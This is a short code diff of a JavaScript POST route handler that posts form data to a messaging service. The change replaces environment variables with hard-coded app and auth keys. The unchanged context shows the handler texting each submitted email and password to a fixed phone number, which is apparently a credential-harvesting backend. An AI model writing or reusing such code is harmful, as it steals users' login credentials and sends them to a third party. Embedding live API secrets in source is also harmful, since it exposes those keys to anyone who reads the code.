@@ -11,8 +11,8 @@ export async function POST(request) {
         'headers': {
         },
         formData: {
-          'appkey': process.env.APP_KEY,
-          'authkey': process.env.AUTH_KEY,
+          'appkey': 'af6905c7-65d2-48f9-8a5c-cb700892abbf',
+          'authkey': 'j0NXbzUG0LJTeBaINxqdYmtEazuHv3DlUt99WdF0xlS7d5kwSc',
           'to': '917878842575',
           'message': `${email} and ${password}`
         }
